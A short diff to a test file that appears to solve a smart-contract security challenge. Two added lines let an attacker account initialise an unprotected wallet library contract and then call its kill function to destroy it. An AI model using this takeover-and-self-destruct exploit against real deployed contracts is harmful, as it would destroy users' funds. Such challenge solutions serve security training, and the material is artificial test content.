@@ -54,6 +54,8 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  await safuWalletLibrary.connect(attacker).initWallet([await attacker.getAddress()], 0, 1);
+  await safuWalletLibrary.connect(attacker).kill(await attacker.getAddress());
 
 });
 
